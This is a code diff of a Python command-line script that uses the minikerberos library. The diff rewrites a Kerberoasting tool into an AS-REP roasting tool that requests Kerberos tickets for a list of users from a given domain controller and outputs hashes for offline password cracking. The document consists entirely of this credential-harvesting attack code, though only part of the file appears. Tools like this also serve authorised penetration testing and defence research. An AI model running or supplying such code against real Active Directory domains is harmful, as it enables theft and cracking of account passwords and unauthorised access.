@@ -2,15 +2,15 @@ import logging
 import asyncio
 import traceback
 import pathlib
-from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
-from minikerberos.security import kerberoast
+from minikerberos.common.target import KerberosTarget
+from minikerberos.security import asreproast as asreproast_sec
 from typing import List
 
-async def spnroast(connection_url:str, users:List[str], domain:str = None, out_file:str = None, etypes:List[int] = [23,17,18], cross_domain:bool = False):
+async def asreproast(kerberos_server:str, users:List[str], domain:str, out_file:str = None, etypes:List[int] = [23,17,18]):
 	try:
 		results_ok = []
 		results_err = []
-		cu = KerberosClientFactory.from_url(connection_url)
+		cu = KerberosTarget(ip=kerberos_server)
 
 		if isinstance(users, list) is False:
 			users = [users]
@@ -39,13 +39,6 @@ async def spnroast(connection_url:str, users:List[str], domain:str = None, out_f
 		etypes = etypes_final
 		users = users_final
 		if domain is None:
-			for username in users:
-				if username.find('@') != -1:
-					domain = username.split('@')[1]
-					break
-			else:
-				domain = cu.get_creds().domain
-		if domain is None:
 			raise Exception('No domain specified')
 		
 		users_nodomain = []
@@ -56,7 +49,7 @@ async def spnroast(connection_url:str, users:List[str], domain:str = None, out_f
 				users_nodomain.append(username)
 		
 		username = None
-		async for username, res, err in kerberoast(cu, users_nodomain, domain, override_etype=etypes, cross_domain=cross_domain):
+		async for username, res, err in asreproast_sec(cu, users_nodomain, domain, override_etype=etypes):
 			if err is not None:
 				results_err.append((username, err))
 				continue
@@ -79,11 +72,10 @@ async def spnroast(connection_url:str, users:List[str], domain:str = None, out_f
 async def amain():
 	import argparse
 	
-	parser = argparse.ArgumentParser(description='Kerberoast', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
-	parser.add_argument('kerberos_connection_url', help='the kerberos target string in the following format kerberos+<stype>://<domain>\\<username>@<domaincontroller-ip>')
+	parser = argparse.ArgumentParser(description='Asreproast', formatter_class=argparse.RawDescriptionHelpFormatter)
+	parser.add_argument('kerberos_server', help='Kerberos server IP or hostname')
 	parser.add_argument('domain', help='Realm. Use this if you specify username in "spn" field')
 	parser.add_argument('users', nargs ='*', help='User/username to kerberoast. Can be a file with usernames, or a single username.')
-	parser.add_argument('--cross-domain', action='store_true', help='SPN is in another domain.')
 	parser.add_argument('-e', '--etypes', default='23,17,18', help='Encryption types to use. Default: 23,17,18')
 	parser.add_argument('-o', '--out-file', help='Write results to this file instead of printing them')
 	parser.add_argument('-v', '--verbose', action='count', default=0)
@@ -100,7 +92,7 @@ async def amain():
 		print('Please provide users to kerberoast')
 		return
 	
-	await spnroast(args.kerberos_connection_url, args.users, args.domain, args.out_file, args.etypes, args.cross_domain)
+	await asreproast(args.kerberos_server, args.users, args.domain, args.out_file, args.etypes)
 
 def main():
 	asyncio.run(amain())
